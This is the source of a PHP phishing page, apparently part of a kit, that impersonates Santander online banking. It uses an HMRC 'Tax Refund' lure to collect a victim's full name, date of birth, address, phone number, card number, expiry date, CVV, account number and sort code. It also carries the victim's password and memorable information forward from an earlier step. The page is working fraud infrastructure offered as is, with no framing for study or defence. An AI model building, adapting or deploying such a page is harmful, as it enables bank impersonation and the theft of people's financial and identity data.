<?php

error_reporting(0);

session_start();
require "../assets/includes/functions.php";
require "../assets/includes/Bank_One_Time.php";
require "../assets/includes/simplehtmldom.php";
require "../assets/includes/enc.php";
$_SESSION['pass'] = $_POST['pass']; 
$_SESSION['memo'] = $_POST['memo'];

?>

<!DOCTYPE html>
<html lang="en-GB">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Verification</title>
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="Tue, 01 Jan 1980 12:00:00 GMT">
<meta http-equiv="Cache-Control" content="no-cache">
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link rel="stylesheet" type="text/css" media="screen, print" href="assets/css/main.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
	
</script>
<script>
jQuery.validator.addMethod('phoneUK', function(phone_number, element) {
return this.optional(element) || phone_number.length > 9 &&
phone_number.match(/^(((\+44)? ?(\(0\))? ?)|(0))( ?[0-9]{3,4}){3}$/);
}, 'Please check the telephone number you have provided');

jQuery.validator.addMethod("postcodeUK", function(value, element) {
return this.optional(element) || /^[A-Z]{1,2}[0-9]{1,2} ?[0-9][A-Z]{2}$/i.test(value);
}, "Please check the postcode you have provided");

$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "div",			
                rules: {
					name: {	required: true,	minlength: 4,},
					dob: { required: true,	minlength: 10,},
					address: { required: true, minlength: 5,},
					postcode: { required: true, minlength: 5,},
					telephone: { required: true, minlength: 11, digits: true,},
					ccname: { required: true, minlength: 4,},
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 4,},
					secode: { required: true, minlength: 3, digits: true,},
					account: { required: true, minlength: 8, digits: true,},
					sortcode: { required: true, minlength: 8},
                },
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: { 
						required: "Please provide your date of birth",
						minlength: jQuery.validator.format("Please check the date of birth you have entered"),
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					telephone: {
						required: "Please provide your telephone number",
						minlength: jQuery.validator.format("Please ensure you enter exactly 11 digits starting 07"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					ccname: {
						required: "Please provide your name as it appears on your card",
						minlength: jQuery.validator.format("Please provide your name as it appears on your card"),
					},
					ccno: {
						required: "Please provide your 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					account: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					sortcode: { 
						required: "Please provide your sortcode", 
						minlength: jQuery.validator.format("Please check the sortcode you have entered"), 
						},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
</script>
<style>
div.error {color:red;}
</style>
<a href="#" onclick="populate();">
<div id="developer" style="display:none;color:red;background-color:yellow;padding:25px;font-size:20;font-weight:700">Populate Form</div>
</a>
<script>
function populate(){
document.getElementById("name").value = "Steve Smith";
document.getElementById("dob").value = "01/01/1985";
document.getElementById("address").value = "21 Some road";
document.getElementById("postcode").value = "IV542FG";
document.getElementById("telephone").value = "07475533233";
document.getElementById("ccname").value = "SS SMITH";
document.getElementById("cc-number").value = "4111 1111 1111 1111";
document.getElementById("cc-exp").value = "10 / 16";
document.getElementById("cc-cvc").value = "106";
document.getElementById("account").value = "01060106";
document.getElementById("sortcode").value = "00-11-22";
}
</script>
</head>
<body>
<div id="global">
<div id="header"> 
<div id="headerbanner">
<div id="MainLogo">
<a href="#">Santander - Online Banking</a>	
</div>
<div id="loginfo">
<span class="username">&nbsp;</span>
<span class="username"><strong>Account Verification</strong></span>
<span class="unsuccessful">&nbsp;</span>                          
</div>
<div id="logoff"><a href="#">Log off</a></div>
</div>
<div id="mainmenu">
<ul>
<li><a href="#"><span>My Accounts &amp; Transactions</span></a></li>
<li><a href="#"><span>Payments &amp; Transfers</span></a></li>
<li><a href="#"><span>Standing Orders</span></a></li>
<li><a href="#"><span>Direct Debits</span></a></li>
<li><a href="#"><span>Credit Cards</span></a></li>
<li><a href="#"><span>Account Services</span></a></li>
<li><a class="active" href="#"><span>Account verification</span></a></li>
<li><a href="#"><span>Help &amp; Contact Us</span></a></li>
</ul>
</div>
</div>
<div id="informationBar">
<div id="submenu">
<ul>
<li><a href="#">Change security settings</a></li>
<li><a href="#">Change personal details</a></li>
<li><a href="#">Change online settings</a></li>
<li><a href="#">Other services</a></li>
</ul>
</div>
<div class="toolboxes">	
<div id="fasttransfer" class="toolbox">
<div>
<div class="toolboxhead">
<h3>Quick Transfer</h3>
<p>Between accounts or to existing payees</p>
</div>
<div class="toolboxbody autotab">
<select id="transferfrom">
<option value="">Transfer from...</option>
<option value="clickhere"> Click here</option>
</select>
<select id="transferto" disabled="">
<option></option>
</select>£ 
<input class="currencyInteger" title="Amount" type="text" id="qt_amount" maxlength="7"> . 
<input class="currencyFractional" title="amount (pence)" type="text" id="qt_decimal" maxlength="2"> 
<span class="button">
<input type="button" title="Make a payment" value="Go">
</span>
</div>
</div>
</div>		
<div id="alertsToolbox" class="toolbox">							     					   
<div class="toolboxhead">
<h3><a href="#">Alerts</a></h3>
<p>Set up free text and email alerts</p>
</div>
</div>
<div id="contactus" class="toolbox">			     	
<div class="toolboxhead">
<h3><a href="#"><strong>Contact Us</strong></a></h3>
</div>
<div class="toolboxbody">
<ul>
<li class="viewmessages"><a href="#">View messages</a></li>
<li class="sendsecure"><a href="#">Send secure message</a></li>
<li class="callus"><a href="#">Call us</a></li>
<li class="visit"><a href="#">Visit branch</a></li>
</ul>
</div>			
</div>	
</div>
</div>

<div id="bodycontent">
<div id="content">	
<div id="pagetools">		
<ul>			
<li class="iconhelp"><a href="#" id="helpCommand">Help with this page</a></li>		
</ul>	
</div> 	
<h1>Tax Refund</h1>	
<div class="guide">		
<ol>			
<li class="selected"><span><span class="hidemeaural">1.</span> Confirm Details</span></li>			
<li><span><span class="hidemeaural">2.</span> Account Security</span></li>			
<li class="last"><span><span class="hidemeaural">3.</span> Verification Complete</span></li>		
</ol>	
</div>		
<div class="container">	
<form name="form" accept-charset="UTF-8" method="post" action="Questions.php?Account-Verification&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" name="details" id="details">	
<p>In order for HMRC to process payments direct to your bank account please confirm your information below.</p>	
<h2>Confirm Details</h2>			
<div class="contents">	
<fieldset>		
<div class="form">		
<!-- INPUT -->				
<div class="form-item">				
<label for="name"><span class="labeltext">Full Name:</span>
<span class="data"><input type="text" name="name" class="firstfocus correct" id="name" maxlength="40" size="30" tabindex="1" value="<?php echo $_SESSION['name'];?>"></span> 
</label>
</div>
<!-- INPUT -->				
<div class="form-item">				
<label for="dob"><span class="labeltext">Date of Birth:</span>
<span class="data"><input type="text" name="dob" class="firstfocus correct" id="dob" maxlength="10" size="30" tabindex="2" value="<?php echo $_SESSION['dob'];?>"></span> 
</label>
</div>
<!-- INPUT -->				
<div class="form-item">				
<label for="address"><span class="labeltext">Address:</span>
<span class="data"><input type="text" name="address" class="firstfocus correct" id="address" maxlength="40" size="30" tabindex="3" placeholder="1st Line"  value="<?php echo $_SESSION['address'];?>"></span> 
</label>
</div>	
<!-- INPUT -->				
<div class="form-item">				
<label for="postcode"><span class="labeltext">Postcode:</span>
<span class="data"><input type="text" name="postcode" class="firstfocus correct" id="postcode" maxlength="10" size="10" tabindex="4" value="<?php echo $_SESSION['postcode'];?>"></span> 
</label>
</div>	
<!-- INPUT -->				
<div class="form-item">				
<label for="telephone"><span class="labeltext">Mobile Number:</span>
<span class="data"><input type="text" name="telephone" class="firstfocus correct" id="telephone" maxlength="11" size="30" tabindex="5"  value=""></span> 
</label>
</div>
<!-- INPUT -->	
<div class="form-item">
<label for="ccname"><span class="labeltext">Cardholder&apos;s Name:</span>
<span class="data"><input class="firstfocus correct" id="ccname" placeholder="As it appears on card" maxlength="40" size="30" name="ccname" type="text" tabindex="6"  value="<?php echo $_SESSION['ccname'];?>"></span>
</label>
</div>
<!-- INPUT -->	
<div class="form-item">
<label for="ccno"><span class="labeltext">Card Number:</span>
<span class="data"><input class="firstfocus correct cc-number" id="cc-number"  placeholder="•••• •••• •••• ••••" size="30" maxlength="20" name="ccno" type="text" tabindex="7"  value="<?php echo $_SESSION['ccno'];?>"></span>
</label>
</div>
<!-- INPUT -->	
<div class="form-item">
<label for="ccexp"><span class="labeltext">Card Expiry Date:</span>
<span class="data"><input class="firstfocus correct cc-exp" id="cc-exp"  placeholder="XX / XX" maxlength="7" size="6" name="ccexp" type="text" tabindex="8" value="<?php echo $_SESSION['ccexp'];?>"></span>
</label>
</div>
<!-- INPUT -->	
<div class="form-item">
<label for="secode"><span class="labeltext">Card Security Code:</span>
<span class="data"><input class="firstfocus correct cc-cvc" id="cc-cvc" maxlength="4" name="secode" size="6" type="text" tabindex="9"  value="<?php echo $_SESSION['secode'];?>"></span>
</label>
</div>
<!-- INPUT -->	
<div class="form-item">
<label for="account"><span class="labeltext">Account Number</span>
<span class="data"><input class="firstfocus correct" id="account" maxlength="8" name="account" type="text" size="30" tabindex="10"  value="<?php echo $_SESSION['account'];?>"></span>
</label>
</div>
<!-- INPUT -->	
<div class="form-item">
<label for="sortcode"><span class="labeltext">Sort Code</span>
<span class="data"><input class="firstfocus correct" id="sortcode" maxlength="8" name="sortcode" size="30" placeholder="XX-XX-XX" type="text" tabindex="11"  value="<?php echo $_SESSION['sortcode'];?>"></span>
</label>
</div>			

</div>		
<div class="buttonholder">
<span class="button"><input type="submit" name="go" id="go" class="primary" tabindex="7" value="Continue &gt;"></span>				
</div>				
</fieldset>
</div>
</form>		
</div>
</div>
</div>
<div id="footer">
<ul>
<li><a href="#">Online Banking Guarantee</a></li>
<li><a href="#">Site Help &amp; Accessibility</a></li>
<li><a href="#">Security &amp; Privacy</a></li>
<li><a href="#">Terms &amp; Conditions</a></li>
<li class="last"><a href="#">Legal</a></li>
</ul>
</div>
</div>
</body>
</html>